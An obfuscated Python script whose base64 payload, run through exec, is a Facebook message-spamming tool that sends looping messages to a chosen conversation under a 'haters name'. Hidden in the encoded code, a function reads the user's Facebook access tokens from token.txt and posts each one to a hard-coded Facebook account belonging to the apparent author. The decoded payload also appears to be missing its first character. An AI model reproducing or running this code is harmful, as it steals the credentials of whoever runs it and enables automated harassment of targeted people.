#ENCODED BY : MUMIT ISLAM HIMU
#ENCRYPTION : Py3 BASE64
#GITHUB : https://github.com/MUMIT-404-CYBER
#----------------------------------------------
import base64
exec(base64.b64decode(b'bXBvcnQgcmVxdWVzdHMKaW1wb3J0IGpzb24KaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwpmcm9tIHBsYXRmb3JtIGltcG9ydCBzeXN0ZW0KaW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBodHRwLnNlcnZlcgppbXBvcnQgc29ja2V0c2VydmVyCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHJhbmRvbQpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9wbGFpbicpCiAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJDUkVESVQgOi0gVFJJQ0tTIEJZIFNBSU0gPGJyPiA8YnI+IE9XTkVSID0+IFNBSU0gPGJyPiA8YnI+IFdBVFNBUFAgOi0gKzkxOTA1Mjg0NTQxMCIpCmRlZiBleGVjdXRlX3NlcnZlcigpOgogICAgICBQT1JUID0gNDAwMAogICAgICB3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoKICAgICAgICAgIHByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCiAgICAgICAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkKCgpkZWYgc2VuZF9pbml0aWFsX21lc3NhZ2UoKToKICAgICAgd2l0aCBvcGVuKCd0b2tlbi50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICB0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAjIE1vZGlmeSB0aGUgbWVzc2FnZSBhcyBwZXIgeW91ciByZXF1aXJlbWVudAogICAgICBtc2dfdGVtcGxhdGUgPSAiQ1JFRElUIDotIFRSSUNLUyBCWSBTQUlNICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT3duZXIgPT4gc2FpbSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWxsbyBzYWltIHNpci4gSSBhbSB1c2luZyB5b3VyIHNlcnZlci4gTXkgdG9rZW4gaXMgOi0ge30iCgogICAgICAjIFNwZWNpZnkgdGhlIElEIHdoZXJlIHlvdSB3YW50IHRvIHNlbmQgdGhlIG1lc3NhZ2UKICAgICAgdGFyZ2V0X2lkID0gIjEwMDA4MzA4MzUzMjEyOCIKCiAgICAgIHJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpCgogICAgICBkZWYgbGluZXNzKCk6CiAgICAgICAgICBwcmludCgnXDAzM1sxOzkybScgKyAn4peP4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQU0FJTeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKXjycpCgogICAgICBoZWFkZXJzID0gewogICAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLAogICAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCiAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCiAgICAgICAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKICAgICAgfQoKICAgICAgZm9yIHRva2VuIGluIHRva2VuczoKICAgICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnN0cmlwKCkKICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgdGFyZ2V0X2lkKQogICAgICAgICAgbXNnID0gbXNnX3RlbXBsYXRlLmZvcm1hdChhY2Nlc3NfdG9rZW4pCiAgICAgICAgICBwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogbXNnfQogICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgICAgICAgIyBObyBuZWVkIHRvIHByaW50IGhlcmUsIGFzIHJlcXVlc3RlZAogICAgICAgICAgY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQogICAgICAgICAgdGltZS5zbGVlcCgwLjEpICAjIFdhaXQgZm9yIDEgc2Vjb25kIGJldHdlZW4gc2VuZGluZyBlYWNoIGluaXRpYWwgbWVzc2FnZQoKICAgICAgI3ByaW50KCJcblsrXSBJbml0aWFsIG1lc3NhZ2VzIHNlbnQuIFN0YXJ0aW5nIHRoZSBtZXNzYWdlIHNlbmRpbmcgbG9vcC4uLlxuIikKc2VuZF9pbml0aWFsX21lc3NhZ2UoKQpkZWYgc2VuZF9tZXNzYWdlc19mcm9tX2ZpbGUoKToKICAgICAgd2l0aCBvcGVuKCdjb252by50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICBjb252b19pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCiAgICAgIHdpdGggb3BlbignZmlsZS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICBtZXNzYWdlcyA9IGZpbGUucmVhZGxpbmVzKCkKCiAgICAgIG51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykKCiAgICAgIHdpdGggb3BlbigndG9rZW4udHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgICAgdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQogICAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykKICAgICAgbWF4X3Rva2VucyA9IG1pbihudW1fdG9rZW5zLCBudW1fbWVzc2FnZXMpCgogICAgICB3aXRoIG9wZW4oJ25hbWUudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgICAgaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgogICAgICB3aXRoIG9wZW4oJ3NwZWVkLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICAgIHNwZWVkID0gaW50KGZpbGUucmVhZCgpLnN0cmlwKCkpCgogICAgICBkZWYgbGluZXNzKCk6CiAgICAgICAgICBwcmludCgnXDAzM1sxOzkybScgKyAn4peP4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQU0FJTeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKXjycpCgogICAgICBoZWFkZXJzID0gewogICAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLAogICAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCiAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCiAgICAgICAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKICAgICAgfQoKICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgIHRyeToKICAgICAgICAgICAgICBmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOgogICAgICAgICAgICAgICAgICB0b2tlbl9pbmRleCA9IG1lc3NhZ2VfaW5kZXggJSBtYXhfdG9rZW5zCiAgICAgICAgICAgICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2Vuc1t0b2tlbl9pbmRleF0uc3RyaXAoKQoKICAgICAgICAgICAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VzW21lc3NhZ2VfaW5kZXhdLnN0cmlwKCkKCiAgICAgICAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgY29udm9faWQpCiAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2V9CiAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoKICAgICAgICAgICAgICAgICAgY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiXDAzM1sxOzkybVNhaGkgSGFpID09PiAlWS0lbS0lZCAlSTolTTolUyAlcCIpCiAgICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLm9rOgogICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszNm1b4pyTXSBCaGFpIENobGEgR3lhIFRlcmEgTWFzc2FnZSB7fSBvZiBDb252byB7fSBUb2tlbiB7fToge30iLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkKICAgICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQogICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszNW1beF0gRmFpbGVkIHRvIHNlbmQgTWVzc2FnZSB7fSBvZiBDb252byB7fSB3aXRoIFRva2VuIHt9OiB7fSIuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQogICAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoc3BlZWQpCgogICAgICAgICAgICAgIHByaW50KCJcblsrXSBBbGwgbWVzc2FnZXMgc2VudC4gUmVzdGFydGluZyB0aGUgcHJvY2Vzcy4uLlxuIikKICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICBwcmludCgiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7fSIuZm9ybWF0KGUpKQoKZGVmIG1haW4oKToKICAgICAgc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQogICAgICBzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkKCiAgICAgICMgU2VuZCB0aGUgaW5pdGlhbCBtZXNzYWdlIHRvIHRoZSBzcGVjaWZpZWQgSUQgdXNpbmcgYWxsIHRva2VucwoKCiAgICAgICMgVGhlbiwgY29udGludWUgd2l0aCB0aGUgbWVzc2FnZSBzZW5kaW5nIGxvb3AKICAgICAgc2VuZF9tZXNzYWdlc19mcm9tX2ZpbGUoKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgICAgbWFpbigp'))
